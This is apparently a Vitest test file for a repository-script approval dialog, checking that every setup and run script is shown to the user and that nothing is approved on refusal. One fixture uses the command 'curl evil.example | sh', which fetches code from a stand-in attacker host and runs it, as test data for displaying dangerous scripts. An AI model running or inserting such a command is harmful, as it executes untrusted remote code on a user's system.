import { describe, expect, it, vi } from 'vitest'
import type { ConfirmationDialogOptions } from '@/components/confirmation-dialog-context'
import { approveRepositoryScripts } from './repository-scripts-approval'

const scripts = [
  { repoName: 'web', setup: 'pnpm install', run: 'pnpm dev', hash: 'a'.repeat(64) },
  { repoName: 'api', setup: null, run: 'curl evil.example | sh', hash: 'b'.repeat(64) }
]

describe('approveRepositoryScripts', () => {
  it('asks nothing when no repository brings a script', async () => {
    const confirm = vi.fn(async (_options: ConfirmationDialogOptions) => true)
    expect(await approveRepositoryScripts([], confirm)).toEqual([])
    expect(confirm).not.toHaveBeenCalled()
  })

  it('shows every script and approves exactly what was shown', async () => {
    const confirm = vi.fn(async (_options: ConfirmationDialogOptions) => true)
    expect(await approveRepositoryScripts(scripts, confirm)).toEqual([
      'a'.repeat(64),
      'b'.repeat(64)
    ])
    const { description } = confirm.mock.calls[0][0]
    for (const shown of ['web', 'pnpm install', 'pnpm dev', 'api', 'curl evil.example | sh']) {
      expect(description).toContain(shown)
    }
  })

  it('approves nothing on No, or when no dialog can be shown', async () => {
    expect(await approveRepositoryScripts(scripts, async () => false)).toEqual([])
    expect(await approveRepositoryScripts(scripts, null)).toEqual([])
  })
})
